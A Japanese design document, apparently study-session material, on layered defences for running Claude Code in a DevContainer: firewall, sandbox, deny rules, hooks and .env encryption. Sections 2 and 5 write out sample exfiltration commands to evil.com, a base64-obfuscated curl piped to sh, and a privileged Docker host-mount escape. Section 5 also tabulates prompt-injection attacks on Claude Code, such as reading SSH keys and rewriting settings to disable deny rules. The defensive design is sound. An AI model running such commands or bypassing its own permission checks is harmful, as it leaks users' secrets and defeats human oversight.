# Claude Code セキュア環境 — 設計ポイント

> 作成日: 2026/04/03 / 更新: 2026/04/10
> 対象リポジトリ: https://github.com/ktsuchida11/claude-dev-env
> 用途: 勉強会の補足資料 / リポジトリのdocsに配置

---

## 0. 全体像 — ホストとコンテナの二段構え

本環境のセキュリティ対策は **ホスト Mac** と **DevContainer** の 2 つのレイヤーで構成される。

```
ホスト Mac（mac_security_check/）
┌─────────────────────────────────────────────────┐
│  ・Claude Code グローバル deny ルール              │
│  ・パッケージマネージャ クールダウン設定             │
│  ・IOC データベース + 週次サプライチェーンチェック    │
│  ・macOS TCC 権限監査、VS Code 拡張監査            │
│  ・Git hooks 検査、SSH 鍵監査                     │
│  ~/.ssh, ~/.aws, 他のリポジトリ → 触れない          │
└────────────────┬────────────────────────────────┘
                 │ Docker
DevContainer（workspace/.claude/）
┌────────────────┴────────────────────────────────┐
│  L7: コンテナ隔離（非 root ユーザー node）          │
│  L6: --dangerously-skip-permissions 無効化        │
│  L5: Sandbox + Permission deny リスト              │
│  L4: Post-install 監査（npm audit / pip-audit）    │
│  L3: パッケージマネージャ設定（.npmrc, .pip.conf 等）│
│  L2: Pre-install ガード（typosquatting 検知等）     │
│  L1: 危険コマンドブロック（block-dangerous.sh）      │
│  L0: ファイアウォール（iptables + ipset）            │
└─────────────────────────────────────────────────┘
```

ホスト側のセットアップは `mac_security_check/setup.sh` で一括実行できる。
詳細は [`mac_security_check/COMPLETE-SETUP-GUIDE.md`](mac_security_check/COMPLETE-SETUP-GUIDE.md) を参照。

---

## 1. 設計思想 — 「構造で守る」

Claude Codeは強力なツールだが、ファイル操作・コマンド実行・ネットワーク通信という
攻撃面の広い権限を持つ。運用ルールだけでは守りきれない。

本環境の設計思想は **「人間の注意力に依存せず、構造で安全を担保する」** こと。

```
┌─────────────────────────────────────────┐
│            ホスト PC（完全に隔離）         │
│  ~/.ssh, ~/.aws, 他のリポジトリ → 触れない │
└────────────────┬────────────────────────┘
                 │ Docker
┌────────────────┴────────────────────────┐
│         Dev Container（第1層: 物理隔離）   │
│                                         │
│  ┌───────────────────────────────────┐  │
│  │  ファイアウォール（第2層: 通信制御）  │  │
│  │  iptables + ipset                 │  │
│  │  許可ドメイン以外 → 全ブロック      │  │
│  └──────────────┬────────────────────┘  │
│                 │                        │
│  ┌──────────────┴────────────────────┐  │
│  │  Sandbox（第3層: プロセス隔離）     │  │
│  │  bubblewrap (Linux)               │  │
│  │  /workspace のみ書込可             │  │
│  │  allowedDomains で通信先制限       │  │
│  └──────────────┬────────────────────┘  │
│                 │                        │
│  ┌──────────────┴────────────────────┐  │
│  │  Permissions + Hooks（第4層: 操作制御）│
│  │  deny ルール + block-dangerous.sh │  │
│  │  bypass mode 無効化               │  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

**4層の防御を重ねることで、1層が突破されても他の層で食い止める。**

---

## 2. 各層の役割と設定

### 第1層: DevContainer（物理隔離）

**何を守るか**: ホストPCのファイルシステム

| 脅威 | 対策 |
|------|------|
| ~/.ssh/id_rsa の読み取り | コンテナ内に存在しない |
| ~/.aws/credentials の読み取り | コンテナ内に存在しない |
| 他のリポジトリへのアクセス | /workspace のみマウント |
| ホストのプロセスへの影響 | コンテナのプロセス空間は隔離 |
| **Docker API 経由のコンテナエスケープ** | **docker-socket-proxy で API 粒度を制限**（下記参照） |

**ポイント**:
- Claude Codeがどんなコマンドを実行しても、ホストPCには影響しない
- これが「最終的な安全ネット」として機能する
- APIキー（`.env`）はコンテナ内にのみ存在し、ホスト環境から分離

**Docker Socket Proxy**: dev コンテナから `docker` / `docker compose` を使用する際、`/var/run/docker.sock` を直接マウントする代わりに `tecnativa/docker-socket-proxy` を経由する。直接マウントは `docker run --privileged -v /:/host ...` 等で **ホスト root 掌握可能** な王道経路となるため、proxy で許可 API を最小化して遮断する。

- 許可: `CONTAINERS` / `IMAGES` / `NETWORKS` / `VOLUMES` / `SERVICES` / `TASKS` / `EXEC` / `BUILD` / `INFO` / `PING` / `VERSION` / `POST`
- 無効: `AUTH` / `SECRETS` / `SWARM` / `SYSTEM`(prune) / `CONFIGS` / `PLUGINS` / `NODES` / `DISTRIBUTION`
- proxy 自身も `read_only: true` + リソース制限で強化、socket は `:ro` で接続

### 第2層: ファイアウォール（通信制御）

**何を守るか**: データの外部流出

```
init-firewall.sh の仕組み:

1. ipset で許可IPセットを作成（IPv4: hash:net + IPv6: hash:net family inet6）
2. Google CDN の CIDR レンジを追加（IP ローテーション対策）
3. 許可ドメインをDNS解決（A + AAAA レコード）→ IPセットに追加
4. iptables + ip6tables で OUTPUT チェインに以下を設定:
   - 許可IPセットへの通信 → ACCEPT
   - Docker内部ネットワーク (172.16.0.0/12) → ACCEPT
   - それ以外 → REJECT
```

| 脅威 | 対策 |
|------|------|
| Prompt Injectionによるデータ送信 | 送信先がホワイトリスト外ならブロック |
| 悪意のあるnpmパッケージのpostinstall | 許可ドメイン外への通信は不可 |
| リバースシェルの確立 | 攻撃者のサーバーへの通信がブロック |

**ポイント**:
- **全プロセスに適用**される（Claude Code, npm, python, gh 全て）
- Claude Codeのsettings.jsonとは独立した、OSレベルの制御
- `NET_ADMIN` ケーパビリティが必要（docker-compose.ymlで設定済み）

**許可ドメイン一覧**:

| カテゴリ | ドメイン | 用途 |
|---------|---------|------|
| パッケージ | registry.npmjs.org, cdn.npmjs.org, registry.yarnpkg.com | npm / yarn |
| パッケージ | pypi.org, files.pythonhosted.org | pip / uv |
| パッケージ | repo1.maven.org, plugins.gradle.org, services.gradle.org | Maven / Gradle |
| GitHub | api.github.com + IPレンジ, *.githubusercontent.com | git / gh CLI |
| LLM API | api.anthropic.com, claude.ai | Claude |
| LLM API | api.openai.com, openaipublic.blob.core.windows.net | OpenAI |
| Google | oauth2.googleapis.com, accounts.google.com, www.googleapis.com | Google API |
| Google CDN | CIDR レンジ (142.250.0.0/15 等) + IPv6 | Google サービス全般（IP ローテーション対策） |
| MCP | context7.com, mcp.context7.com, api.context7.com | Context7 |
| VS Code | marketplace.visualstudio.com 等 | 拡張インストール |

### 第3層: Sandbox（プロセス隔離）

**何を守るか**: Claude Codeが実行するコマンドの影響範囲

```json
// settings.json 抜粋
"sandbox": {
  "enabled": true,
  "autoAllowBashIfSandboxed": true,
  "filesystem": {
    "allowWrite": ["/workspace", "~/.npm", "~/.cache", "~/.m2/repository", "~/.gradle", "/tmp"],
    "denyWrite": ["settings.json", ".claude.json", "/etc"],
    "denyRead": ["~/.ssh", "~/.aws", "~/.gnupg"]
  },
  "network": {
    "allowedDomains": ["github.com", "api.openai.com", ...],
    "allowLocalBinding": true,
    "allowAllUnixSockets": true
  }
}
```

| 脅威 | 対策 |
|------|------|
| /etc/passwd の書き換え | denyWrite: /etc |
| settings.jsonの改ざん（denyルール無効化） | denyWrite で保護 |
| 秘密鍵の読み取り | denyRead: ~/.ssh |
| 未許可ドメインへの通信 | allowedDomains で制限 |

**ポイント**:

- **`autoAllowBashIfSandboxed: true` の設計判断**: Sandboxで物理的に隔離しているので、その中では自動承認にして実行効率を上げる。deny ルールは自動承認より優先されるため、危険コマンドは引き続きブロックされる
- **ファイアウォールとの2層構造**: ファイアウォール（全プロセス対象）+ Sandbox network（Claude sandbox内bashのみ対象）。両方を通過しないと外部通信できない
- **localhostは自由**: `allowLocalBinding: true` + `allowAllUnixSockets: true` で、開発サーバー間のローカル通信は制限しない

### 第4層: Permissions + Hooks（操作制御）

**何を守るか**: Claude Codeのツール実行レベルの制御

**Permissionsの設計**:

```
allow（50項目）: 日常的な開発コマンドを網羅
  → Sandbox内で自動承認されるため、許可プロンプトが出ない

deny（29項目）: ネットワーク系 + 権限昇格 + 秘密情報アクセス
  → Sandbox + autoAllowBashIfSandboxed でも deny は最優先で拒否

disableBypassPermissionsMode: "disable"
  → --dangerously-skip-permissions フラグ自体を無効化
```

**Hooksの設計**:

| Hook | トリガー | 役割 |
|------|---------|------|
| block-dangerous.sh | PreToolUse (Bash) | パイプ結合・難読化パターンの検出 |
| lint-on-save.sh | PostToolUse (Edit) | ファイル編集後の自動lint/format |

**なぜ deny ルールだけでは不十分か**:

deny ルールはパターンマッチベースのため、以下のようなバイパスが理論上可能:

```bash
# deny: Bash(curl *) をバイパス
python3 -c "import urllib.request; urllib.request.urlopen('http://evil.com')"

# パイプで繋いで検出を回避
cat /workspace/.env | python3 -c "import sys; ..."

# base64 で難読化してシェル実行
echo Y3VybCBodHRwOi8vZXZpbC5jb20= | base64 --decode | sh
```

block-dangerous.sh はコマンド文字列全体を正規表現で検査するため、パイプ結合やサブシェルを使ったバイパスも検出できる。**deny + Hooks = 多層防御**。

---

## 3. ファイアウォール ↔ sandbox.network の使い分け

両方にドメインを入れる必要があるか？ という疑問への回答。

```
外部インターネット
        ▲
        │
┌───────┴────────────────────┐
│  ファイアウォール (iptables)  │  ← 全プロセスの外壁
│  許可リスト: 広め            │
└───────┬────────────────────┘
        │
┌───────┴────────────────────┐
│  sandbox.network            │  ← Claude sandbox内bashの内壁
│  許可リスト: 必要最小限      │
└───────┬────────────────────┘
        │
   Claude の Bash コマンド
```

**ルール**:
- **両方に必要**: sandbox内bashから直接アクセスするドメイン（GitHub, npm, PyPI, API系）
- **ファイアウォールのみ**: Claude外のプロセスが使うドメイン（VS Code, Maven, sentry.io等）
- **sandboxのみに入れても意味がない**: ファイアウォールで止まるため

| ドメイン | FW | sandbox | 理由 |
|---------|:--:|:-------:|------|
| github.com | ✅ | ✅ | git push/pull（sandbox内から実行） |
| registry.npmjs.org | ✅ | ✅ | npm install（sandbox内から実行） |
| pypi.org | ✅ | ✅ | uv/pip install（sandbox内から実行） |
| api.anthropic.com | ✅ | ✅ | Claude API（直接接続） |
| api.openai.com | ✅ | ✅ | OpenAI API（アプリから直接利用時） |
| openaipublic.blob.core.windows.net | ✅ | ✅ | tiktoken データDL |
| Google API 系 | ✅ | ✅ | Gmail API 等 |
| context7.com / *.context7 | ✅ | ✅ | Context7 MCP |
| repo1.maven.org 等 | ✅ | - | Java依存。IDE/CLI が使う |
| VS Code Marketplace 系 | ✅ | - | VS Code 自身が使う |
| Google CDN (CIDR) | ✅ | - | IPv4/IPv6 CIDR レンジで許可（CDN IP ローテーション対策） |
| localhost | ✅ | ✅ | 開発サーバー間通信 |
| Docker 内部 NW | ✅ | - | litellm コンテナ通信 |

---

## 4. LiteLLM経由のモデル切替とセキュリティ

```
パターンA: Anthropic直接接続（デフォルト）
  claude → api.anthropic.com
  通過: ファイアウォール ✅ → sandbox.network ✅

パターンB: LiteLLM経由（claude-litellm エイリアス）
  claude-litellm → Docker内部NW → litellm → api.openai.com
  通過: ファイアウォール ✅（Docker内部NW許可） → sandbox不問（内部NW）
  ※ api.openai.com への通信は litellm コンテナが行う

パターンC: アプリから直接OpenAI API
  python script → api.openai.com
  通過: ファイアウォール ✅ → sandbox.network ✅
```

**パターンBのセキュリティ上の利点**:
- devコンテナのファイアウォールを通過しない（Docker内部NWは別扱い）
- OpenAI APIキーはlitellmコンテナ内にのみ存在可能
- devコンテナからはAPIキーが見えない構成にもできる

---

## 5. Prompt Injection への多層防御

Claude Codeに対するPrompt Injection攻撃の典型パターンと、各層での防御。

| 攻撃パターン | 第1層 DevContainer | 第2層 FW | 第3層 Sandbox | 第4層 Permissions/Hooks |
|-------------|:--:|:--:|:--:|:--:|
| `~/.ssh/id_rsa` を読んで外部に送信 | ✅ 存在しない | ✅ 送信先ブロック | ✅ denyRead | ✅ deny: Read(~/.ssh) |
| `curl http://evil.com -d @.env` | - | ✅ evil.comブロック | ✅ domainにない | ✅ deny: Bash(curl *) |
| settings.json を書き換えてdeny無効化 | - | - | ✅ denyWrite | ✅ Hookで検出 |
| Python で urllib 使ってデータ送信 | - | ✅ 送信先ブロック | ✅ domainにない | ✅ Hookでパターン検出 |
| `.mcp.json` に悪意のMCP追加 | - | - | ✅ denyWrite | ✅ enableAll...: false |
| base64エンコードで難読化実行 | - | ✅ 送信先ブロック | - | ✅ deny + Hook検出 |
| `--dangerously-skip-permissions` | - | - | - | ✅ disable設定で無効 |

**1つのパターンに対して平均3〜4層が防御している。** これが多層防御の意味。

---

## 6. 勉強会で伝えるべきキーメッセージ

1. **「構造で守る」** — 運用ルールに頼らない。DevContainer + ファイアウォール + Sandbox で物理的に制限する
2. **「Sandboxで隔離 → その中で自由に」** — `autoAllowBashIfSandboxed: true` は承認疲れの解消。隔離されているなら自動承認で良い
3. **「deny ルールはパターンマッチの限界を知れ」** — Hooksとの併用で多層防御
4. **「MCP はホワイトリスト方式」** — `enableAllProjectMcpServers: false` が鍵
5. **「bypass mode は構造的に無効化」** — 「使えなくする」のが最強
6. **「ファイアウォール × Sandbox = 2層のネットワーク制御」** — 両方を通過しないと外に出られない
7. **「設定ファイル自体を保護せよ」** — denyWrite でsettings.jsonの改ざんを防ぐ

---

## 7. .env 暗号化（多層防御）

`.env` に API Key やシークレットを平文で保存すると、サプライチェーン攻撃やマルウェアにより盗まれるリスクがある。
本環境では **SOPS + age** による暗号化と、秘密鍵の安全なストレージへの隔離を組み合わせた多層防御を採用する。

### 4 層の防御

| 層 | 守るもの | 手段 |
|----|---------|------|
| **Layer 1: 暗号化** | リポジトリ・転送経路 | SOPS + age で `.env` → `.env.enc` |
| **Layer 2: 鍵の隔離** | 秘密鍵のファイルシステム露出 | プラットフォーム別の安全なストレージ（下表参照） |
| **Layer 3: アクセス制御** | Claude Code からの .env アクセス | `Read(.env*)`, `Write(.env*)`, `Edit(.env*)` を deny |
| **Layer 4: 検知** | 平文 .env のコミット | `env-plaintext-guard.sh` フック + `.gitignore` |

**Layer 2: プラットフォーム別の秘密鍵格納先:**

| プラットフォーム | 格納先 | 認証 |
|----------------|--------|------|
| macOS | Keychain Access | ユーザーパスワード |
| Amazon Linux 2023 | **AWS Secrets Manager（推奨）** | IAM ロール（CloudTrail で監査可能） |
| WSL2 / Ubuntu | secret-tool (libsecret) | D-Bus キーリング |
| フォールバック | `~/.config/age/key.txt` (権限 600) | ファイルシステムのみ |

> **Linux (AL2023) では AWS Secrets Manager を推奨。** IAM ロールで対象シークレットのみアクセス可能に制限でき、
> 全アクセスが CloudTrail に記録されるため、macOS Keychain と同等以上のセキュリティレベルを確保できる。
> スクリプトは自動的に利用可能なバックエンドを検出し、上表の優先順位でフォールバックする。

### フロー

```
セットアップ（ホスト側で1回）:
  scripts/setup-env-encryption.sh
    → age 鍵ペア生成
    → 秘密鍵を Keychain / Secrets Manager に格納（ファイル削除）
    → .env を暗号化 → .env.enc
    → .sops.yaml 生成

DevContainer 起動:
  scripts/start-devcontainer.sh
    → Keychain / Secrets Manager から秘密鍵取得
    → docker cp で /run/secrets/age-key（tmpfs）に注入
    → postStartCommand で decrypt-env.sh が:
        1. /run/secrets/age-key を読み取り
        2. .env.enc → .env を復号
        3. /run/secrets/age-key を即座に削除
    → ホスト側の一時ファイルもゼロ埋め削除

.env 編集後:
  scripts/setup-env-encryption.sh encrypt
    → .env を再暗号化 → .env.enc を git commit
```

### 重要: DevContainer 内での .env は平文になる

暗号化が保護するのは**ホスト側とリポジトリ上**であり、**DevContainer 内では .env は復号された平文**として存在する。これは設計上の制約であり、以下の理由により回避できない。

1. **DevContainer からホスト側のシークレットストレージは参照不可** — Docker コンテナはホスト OS の Keychain / Secrets Manager から隔離されており、コンテナ内のアプリが直接問い合わせることはできない
2. **仮にコンテナ内で鍵を保持して都度復号しても実質同じ** — アプリが秘密情報を使う瞬間にはメモリ上に平文が存在する。鍵をコンテナ内に常時保持すると、攻撃者も同じ手順で復号できるため、セキュリティは向上しない（むしろ鍵の露出時間が増え悪化する）

そのため、DevContainer 内の .env は**暗号化以外の防御層**で保護する:

- **Claude Code deny ルール**: `Read(.env*)`, `Write(.env*)`, `Edit(.env*)` をブロック
- **ファイアウォール**: 外部への送信を遮断（秘密情報の持ち出し防止）
- **ファイル権限**: `chmod 600`（所有者のみ読み取り可）
- **Hooks**: `block-dangerous.sh` が `cat .env` 等もブロック

### Claude Code の .env 保護

| 保護 | 方法 |
|------|------|
| 読み取りブロック | `deny: Read(.env), Read(.env.*)` + `block-dangerous.sh` で cat .env もブロック |
| 書き込みブロック | `deny: Write(.env), Write(.env.*), Edit(.env), Edit(.env.*)` |
| コミット防止 | `env-plaintext-guard.sh` が git commit 時に平文 .env を検知して警告 |
| git 除外 | `.gitignore` で `.env`, `.env.local`, `.env.keys` を除外 |

詳細なガイドは [`env-encryption-defense-in-depth-guide.md`](env-encryption-defense-in-depth-guide.md) を参照。

---

## 8. 配布ファイル一覧

### DevContainer 内（コンテナ側）

| ファイル | 配置先 | 役割 |
|---------|--------|------|
| settings.json | `.claude/settings.json`（ホスト用）<br>`workspace/.claude/settings.json`（コンテナ用） | Permissions + Sandbox + Hooks + MCP 制御 |
| block-dangerous.sh | `.claude/hooks/` | PreToolUse: 危険コマンド検出（28パターン） |
| supply-chain-guard.sh | `.claude/hooks/` | PreToolUse: typosquatting 検知・lockfile チェック |
| dockerfile-cooldown-check.sh | `.claude/hooks/` | PostToolUse: Dockerfile クールダウン確認 |
| gha-security-check.sh | `.claude/hooks/` | PostToolUse: GitHub Actions セキュリティ検査 |
| lint-on-save.sh | `.claude/hooks/` | PostToolUse: 自動 lint/format |
| supply-chain-audit.sh | `.claude/hooks/` | PostToolUse: npm audit / pip-audit 自動実行 |
| env-plaintext-guard.sh | `.claude/hooks/` | PostToolUse: 平文 .env コミット検知・警告 |
| langfuse_hook.py | `.claude/hooks/` | Stop: LangFuse トレーシング（オプション） |
| decrypt-env.sh | `.devcontainer/decrypt-env.sh` | DevContainer 起動時の .env.enc 自動復号 |
| .npmrc | `workspace/.npmrc` | npm: ignore-scripts, min-release-age, レジストリ固定 |
| .pip.conf | `workspace/.pip.conf` | pip: uploaded-prior-to（相対期間 "P7D"）, レジストリ固定 |
| uv.toml | `workspace/uv.toml` | uv: exclude-newer（相対期間 "7 days"）, レジストリ固定 |
| .mvn-settings.xml | `workspace/.mvn-settings.xml` | Maven: Central 固定 |
| init-firewall.sh | `.devcontainer/init-firewall.sh` | OS レベルの通信制御（IPv4/IPv6 dual-stack） |
| install-claude.sh | `.devcontainer/install-claude.sh` | Claude Code CLI インストール |

> hooks と tests は `.claude/` が正（git 管理）。DevContainer 起動時に `workspace/.claude/` へ自動コピーされる。

### ホスト Mac 側

| ファイル | 配置先 | 役割 |
|---------|--------|------|
| setup.sh | `mac_security_check/setup.sh` | 統合セットアップ（1コマンドで全設定） |
| global-claude-setup.sh | `mac_security_check/` | Claude Code グローバル deny ルール適用 |
| claude-code-security-audit.sh | `mac_security_check/` | 設定の監査・レポート |
| mac-supply-chain-check-v2.sh | `mac_security_check/` | 週次サプライチェーンチェック（8項目） |
| mac-supply-chain-check-v3-additions.sh | `mac_security_check/` | 追加チェック（9項目） |
| threat-intel-updater.sh | `mac_security_check/` | IOC データベース日次更新 |
| local-cooldown-setup.sh | `cooldown_management/` | ローカル PC 用クールダウン初期設定 |
| setup-env-encryption.sh | `scripts/` | .env 暗号化セットアップ（SOPS + age + Keychain） |
| start-devcontainer.sh | `scripts/` | Keychain 連携 DevContainer 起動ラッパー |

---

## 9. 関連ドキュメント

| ドキュメント | 内容 |
|---|---|
| [QUICKSTART.md](QUICKSTART.md) | クイックスタートガイド（3ステップセットアップ・デシジョンツリー） |
| [README.md](README.md) | 環境の全体説明・セットアップ手順・各機能の詳細 |
| [SECURITY-GUIDE.md](SECURITY-GUIDE.md) | 本ドキュメント（4層防御の設計思想・脅威モデル） |
| [COMPLETE-SETUP-GUIDE.md](mac_security_check/COMPLETE-SETUP-GUIDE.md) | ホスト Mac セキュリティチェックの詳細ガイド |
| [SECURITY-CHECKLIST.md](.claude/tests/SECURITY-CHECKLIST.md) | セキュリティテストチェックリスト（自動テスト・手動テスト・8層防御カバレッジ） |
| [workspace/CLAUDE.md](workspace/CLAUDE.md) | コンテナ内での環境制約・利用ガイド（Claude Code が読む） |
